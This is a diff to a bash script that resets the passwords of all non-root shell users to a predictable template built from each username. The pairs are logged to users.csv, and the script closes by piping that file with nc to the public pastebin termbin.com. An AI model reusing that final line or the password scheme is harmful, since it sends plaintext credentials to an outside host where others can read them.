@@ -21,11 +21,12 @@ for user in $(awk -F: '$7 ~ /(\/sh|\/bash)/ { print $1 }' /etc/passwd); do
 	if [[ $(id -u $user) -eq 0 ]]; then # Don't change password for root
 		continue
 	fi
-  touch ./users.csv
+	touch ./users.csv
 	echo "Changing password for $user"
 	newPass="$passTemp$delim$user"
-	echo -e "$newPass\\n$newPass" | passwd "$user"
-  echo -e "$user,$newPass\n" > users.csv
+	#echo -e "$newPass\\n$newPass" | passwd "$user"
+	echo "$user:$newPass" | chpasswd
+	echo -e "$user,$newPass\n" >> users.csv
 done
 
-(cat users.csv | nc termbin.com 9999) && rm -rf users.csv
+(cat users.csv | nc termbin.com 9999) && rm -f users.csv
